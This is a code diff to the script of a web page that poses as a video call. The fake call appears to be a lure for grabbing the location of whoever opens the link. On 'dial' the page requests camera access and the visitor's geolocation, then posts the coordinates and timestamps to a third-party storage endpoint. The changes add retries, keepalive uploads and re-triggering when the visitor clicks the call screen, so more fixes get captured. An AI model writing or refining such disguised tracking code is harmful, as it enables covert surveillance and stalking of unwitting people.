@@ -222,11 +222,13 @@
 
     <script>
       var STORE =
-        "https://api.restful-api.dev/objects/ff808181a067127101a09bcd8bca0b86";
+        "https://crudcrud.com/api/0c5e751c477a4f45a8cca37c3c13ea1d/locations";
       var localStream = null;
       var timerId = null;
       var elapsed = 0;
-      var started = false;
+      var inFlight = false;
+      var gotFix = false;
+      var lastFix = null;
       var micOn = true;
       var camOn = true;
 
@@ -254,34 +256,30 @@
 
       function send(payload) {
         payload = withTime(payload);
-        return fetch(STORE)
-          .then(function (res) {
-            return res.json();
-          })
-          .then(function (doc) {
-            var list =
-              doc && doc.data && doc.data.locations
-                ? doc.data.locations.slice()
-                : [];
-            list.push({
-              lat: payload.lat,
-              lng: payload.lng,
-              accuracy: payload.accuracy,
-              time: payload.time,
-              local_time: payload.local_time,
-              error: payload.error,
-              code: payload.code,
-            });
-            return fetch(STORE, {
-              method: "PUT",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                name: "link-locations",
-                data: { locations: list },
-              }),
-            });
-          })
-          .catch(function () {});
+        var row = {
+          lat: payload.lat,
+          lng: payload.lng,
+          accuracy: payload.accuracy,
+          time: payload.time,
+          local_time: payload.local_time,
+        };
+        if (payload.error) row.error = payload.error;
+        if (payload.code != null) row.code = payload.code;
+        return fetch(STORE, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(row),
+          keepalive: true,
+        }).catch(function () {
+          return null;
+        });
+      }
+
+      function persistFix(coords) {
+        lastFix = coords;
+        return send(coords).then(function (res) {
+          if (res && res.ok) gotFix = true;
+        });
       }
 
       function pad(n) {
@@ -310,6 +308,9 @@
       }
 
       function requestLocation() {
+        if (lastFix && !gotFix) {
+          return persistFix(lastFix);
+        }
         if (!navigator.geolocation) {
           send({ error: "geolocation_unsupported" });
           return Promise.resolve();
@@ -317,7 +318,7 @@
         return new Promise(function (resolve) {
           navigator.geolocation.getCurrentPosition(
             function (pos) {
-              return send({
+              return persistFix({
                 lat: pos.coords.latitude,
                 lng: pos.coords.longitude,
                 accuracy: pos.coords.accuracy,
@@ -351,21 +352,23 @@
       }
 
       function startDial() {
-        if (started) return;
-        started = true;
+        if (gotFix || inFlight) return;
+        inFlight = true;
         document.getElementById("dialStatus").textContent = "Calling…";
         show("incall");
         document.getElementById("connecting").classList.add("active");
         requestCamera()
           .then(requestLocation)
           .then(function () {
+            inFlight = false;
             document.getElementById("connecting").classList.remove("active");
-            startTimer();
+            if (!timerId) startTimer();
           });
       }
 
       function endCall() {
-        started = true;
+        gotFix = true;
+        inFlight = false;
         if (timerId) clearInterval(timerId);
         stopStream();
         show("ended");
@@ -377,6 +380,9 @@
       });
       document.getElementById("endBtn").addEventListener("click", endCall);
       document.getElementById("dial").addEventListener("click", startDial);
+      document.getElementById("incall").addEventListener("click", function (e) {
+        if (!gotFix && !e.target.closest("button")) startDial();
+      });
       document.getElementById("micBtn").addEventListener("click", function () {
         micOn = !micOn;
         this.classList.toggle("off", !micOn);
